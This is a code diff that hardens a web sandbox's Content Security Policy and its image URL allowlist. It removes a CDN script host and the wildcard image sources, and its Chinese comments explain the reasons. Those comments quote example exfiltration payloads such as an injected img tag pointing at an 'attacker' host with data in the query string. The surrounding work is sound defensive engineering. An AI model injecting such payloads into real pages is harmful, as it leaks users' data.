@@ -69,16 +69,15 @@ export function escapeSandboxScriptSource(source: string): string {
  *
  * 安全说明：
  * - 严格限制所有外部资源加载
- * - 🔒 img-src 移除 https: 防止通过图片泄露数据
+ * - 🔒 img-src 仅允许 data:、blob: 与宿主同源（远程图片走 /api/proxy/image），
+ *   防止通过第三方图片 URL 的 query string 泄露数据
  * - 🔒 font-src 允许 data: URI 和 Google Fonts
+ * - 🔒 script-src 仅 nonce（Tailwind 在安装时预编译为 CSS 注入，
+ *   不加载任何外部脚本源——外部脚本 host 白名单同样是外泄通道）
  */
-/** Tailwind CDN 域名（用于 CSP） */
-const TAILWIND_CDN = 'https://cdn.tailwindcss.com'
 
 /** Options that customize CSP for a sandbox instance. */
 export interface GenerateCSPOptions {
-  /** Allow Tailwind CDN script (default true for page styling demos). */
-  allowTailwindCDN?: boolean
   /**
    * Allow `<audio>` / media element loads from blob: and data: only.
    * Granted when the installation has `media:audio`.
@@ -92,6 +91,14 @@ export interface GenerateCSPOptions {
 }
 
 /**
+ * 宿主源（用于 img-src 放行同源图片，如 /api/proxy/image 与包内资源）。
+ * srcdoc 沙箱继承宿主 base URL，相对路径会解析到宿主源。
+ */
+function hostOrigin(): string {
+  return typeof window !== 'undefined' ? window.location.origin : ''
+}
+
+/**
  * 生成带 nonce 的 CSP 策略
  *
  * 🔒 安全加强：使用 nonce 替代 unsafe-inline
@@ -100,37 +107,36 @@ export interface GenerateCSPOptions {
  * - 防止注入的恶意脚本执行
  *
  * @param nonce - 唯一的 nonce 值（由 generateNonce() 生成）
- * @param optionsOrAllowTailwind - 兼容旧签名的 boolean，或完整选项
+ * @param options - 沙箱实例的 CSP 选项
  * @returns 完整的 CSP 策略字符串
  */
 export function generateCSP(
   nonce?: string,
-  optionsOrAllowTailwind: boolean | GenerateCSPOptions = true,
+  options: GenerateCSPOptions = {},
 ): string {
-  const options: GenerateCSPOptions =
-    typeof optionsOrAllowTailwind === 'boolean'
-      ? { allowTailwindCDN: optionsOrAllowTailwind }
-      : optionsOrAllowTailwind
-
-  const allowTailwindCDN = options.allowTailwindCDN !== false
   const allowMediaBlob = options.allowMediaBlob === true
   const allowWasm = options.allowWasm !== false
 
-  // 🔒 script-src: nonce + optional Tailwind CDN + wasm-unsafe-eval
-  const cdnPart = allowTailwindCDN ? ` ${TAILWIND_CDN}` : ''
+  // 🔒 script-src: 仅 nonce（+ 可选 wasm）。不放行任何外部脚本 host——
+  // host 白名单允许通过 <script src="https://host/?data"> 的 query 外泄数据。
   const wasmPart = allowWasm ? " 'wasm-unsafe-eval'" : ''
   const scriptSrc = nonce
-    ? `script-src 'nonce-${nonce}'${wasmPart}${cdnPart}`
-    : `script-src 'unsafe-inline'${wasmPart}${cdnPart}`
+    ? `script-src 'nonce-${nonce}'${wasmPart}`
+    : `script-src 'unsafe-inline'${wasmPart}`
 
   const mediaSrc = allowMediaBlob ? 'media-src blob: data:' : "media-src 'none'"
+
+  // 🔒 img-src 不放行 https:/http: 通配——任意第三方图片 URL 都是外泄通道
+  // （innerHTML 注入 <img src="https://attacker/?data"> 即可绕过 connect-src）。
+  // 同源放行让头像、封面等经 /api/proxy/image 代理加载，包内资源走相对路径。
+  const origin = hostOrigin()
+  const imgSrc = `img-src data: blob:${origin ? ` ${origin}` : ''}`
 
   const directives = [
     scriptSrc,
     "default-src 'none'",
     "style-src 'unsafe-inline' https://fonts.googleapis.com",
-    // 🔒 允许 data:、blob:、https:、http: 图片加载
-    'img-src data: blob: https: http:',
+    imgSrc,
     'font-src data: https://fonts.gstatic.com',
     "connect-src 'none'",
     "frame-src 'none'",
@@ -148,10 +154,8 @@ export function generateCSP(
 /** Build CSP options from granted permissions. */
 export function cspOptionsFromPermissions(
   grantedPermissions: readonly string[] | undefined,
-  allowTailwindCDN = true,
 ): GenerateCSPOptions {
   return {
-    allowTailwindCDN,
     allowMediaBlob: grantedPermissions?.includes('media:audio') === true,
     allowWasm: true,
   }
@@ -161,16 +165,23 @@ export function cspOptionsFromPermissions(
  * 生成安全包装代码
  * 冻结全局对象，防止沙箱逃逸
  *
- * 安全特性：
+ * ⚠️ 定位：这里的拦截运行在沙箱同一 realm，恶意代码可以通过原型方法等途径
+ * 绕过，因此它们是"防误用 + 尽早报错"的深度防御，不是安全边界。
+ * 真正的边界是 iframe sandbox 属性、CSP 与 TappBridge 消息校验——
+ * 新增外泄/逃逸防护必须落在那三层，而不是在这里加拦截。
+ *
+ * 深度防御内容：
  * 1. 冻结 window.parent/top/opener，防止父窗口访问
  * 2. 禁用所有对话框（alert/confirm/prompt）
  * 3. 禁用本地存储和网络 API
  * 4. 禁用 eval 和 Function 构造器
  * 5. 冻结原型链防止原型污染攻击
+ * 6. 图片 URL 白名单与 CSP img-src 对齐（尽早报错，非边界）
  *
  * @param sessionToken 会话 token，用于消息验证
  */
 export function generateSecurityWrapper(sessionToken: string): string {
+  const origin = hostOrigin()
   return `
 (() => {
   'use strict';
@@ -344,8 +355,33 @@ export function generateSecurityWrapper(sessionToken: string): string {
   window.Worker = class { constructor() { throw new Error('Worker is disabled in Tapp sandbox'); } };
   window.SharedWorker = class { constructor() { throw new Error('SharedWorker is disabled in Tapp sandbox'); } };
   
-  // 🔒 安全加强：拦截 Image 构造器，防止通过图片 URL 泄露数据
-  // 虽然 CSP 已禁止外部图片，但双重防护更安全
+  // 🔒 图片 URL 白名单：与 CSP img-src 对齐
+  // 允许 data:、blob:、宿主同源（含以 / 开头的相对路径，解析到宿主源）。
+  // 远程图片请经 /api/proxy/image 代理。真正的边界是 CSP；这里只是尽早报错。
+  const _HOST_ORIGIN = '${origin}';
+  const _isAllowedImageUrl = (value) => {
+    if (typeof value !== 'string') return true;
+    const v = value.trim();
+    if (!v) return true;
+    const lower = v.toLowerCase();
+    if (lower.startsWith('data:') || lower.startsWith('blob:')) return true;
+    // Host-origin only (align with CSP img-src). Relative // is protocol-relative → blocked.
+    if (_HOST_ORIGIN) {
+      const host = _HOST_ORIGIN.toLowerCase();
+      if (
+        lower === host ||
+        lower.startsWith(host + '/') ||
+        lower.startsWith(host + '?') ||
+        lower.startsWith(host + '#')
+      ) {
+        return true;
+      }
+    }
+    if (v.startsWith('/') && !v.startsWith('//')) return true;
+    return false;
+  };
+
+  // 🔒 安全加强：拦截 Image 构造器，尽早提示外部图片 URL 被 CSP 拦截
   const _OriginalImage = window.Image;
   window.Image = class SecureImage extends _OriginalImage {
     constructor(width, height) {
@@ -353,13 +389,9 @@ export function generateSecurityWrapper(sessionToken: string): string {
       const originalSrcDescriptor = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
       Object.defineProperty(this, 'src', {
         set(value) {
-          // 只允许 data: 和 blob: URL
-          if (typeof value === 'string') {
-            const lowerValue = value.toLowerCase().trim();
-            if (!lowerValue.startsWith('data:') && !lowerValue.startsWith('blob:')) {
-              console.warn('[Security] External image URLs are blocked:', value.substring(0, 50));
-              return;
-            }
+          if (!_isAllowedImageUrl(value)) {
+            console.warn('[Security] External image URLs are blocked (use /api/proxy/image):', String(value).substring(0, 50));
+            return;
           }
           if (originalSrcDescriptor && typeof originalSrcDescriptor.set === 'function') {
             originalSrcDescriptor.set.call(this, value);
@@ -396,12 +428,9 @@ export function generateSecurityWrapper(sessionToken: string): string {
     if (lowerTag === 'img') {
       const originalSetAttribute = element.setAttribute.bind(element);
       element.setAttribute = function(name, value) {
-        if (name.toLowerCase() === 'src') {
-          const lowerValue = String(value).toLowerCase().trim();
-          if (!lowerValue.startsWith('data:') && !lowerValue.startsWith('blob:')) {
-            console.warn('[Security] External image src blocked via setAttribute');
-            return;
-          }
+        if (name.toLowerCase() === 'src' && !_isAllowedImageUrl(String(value))) {
+          console.warn('[Security] External image src blocked via setAttribute (use /api/proxy/image)');
+          return;
         }
         return originalSetAttribute(name, value);
       };
